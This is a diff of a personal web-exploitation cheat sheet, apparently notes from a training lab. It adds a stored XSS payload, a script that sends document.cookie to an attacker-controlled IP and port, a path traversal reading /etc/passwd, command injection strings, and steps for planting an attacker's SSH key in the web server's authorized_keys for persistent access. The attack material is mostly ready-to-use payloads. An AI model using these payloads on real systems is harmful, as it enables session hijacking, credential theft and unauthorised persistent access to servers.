@@ -239,7 +239,7 @@ Stored XSS
     Only requires user to visit page
 
 
-<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
+<img src="http://invalid" onerror="window.open('http://10.50.31.213:8000/ram.png','xss','height=1,width=1');">
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Useful JavaScript Components
 
@@ -257,6 +257,7 @@ Proof of concept (simple alert):
     Capturing Sensitive Data
     document.body.innerHTML
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+RETRIEVE COOKIES
 <script>document.location="http://10.50.31.213:8000/"+document.cookie;</script>
 
 python3 -m http.server
@@ -270,7 +271,7 @@ Directory Traversal/Path Traversal
 
     Uses ../../ (relative paths) in manipulating a server-side file path
 
-
+note that 'file=' is IMMEDIATELY proceeded by ../../../
 view_image.php?file=../../etc/passwd
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Malicious File Upload
@@ -320,18 +321,22 @@ system("ping -c 1 ".$_GET["ip"]);
 
 Run the following to chain/stack our arbitrary command
 
+Injections
 ; cat /etc/passwd
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ; <command>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-If shit allows command injection because no input validation: 
 
+If shit allows command injection because no input validation: 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 (web server)  ;mkdir /var/www/.ssh                <- You've just created an ssh config file for the www-data account (or whatever account you're on)
 lin-ops> ssh-keygen -t rsa -b 4096                <- You've just created an ssh key for yourself(Hit enter when it asks for specifications)
 lin-ops> cat <public key>
 copy+paste the entire contents into the web server with a quote at the start
 then add to the end ' >>/var/www/.ssh/authorized_keys'
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SMB finder scripty - --script=smb-os-discovery
+Or some shit -   . .     -
+               \     /
+                ||
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
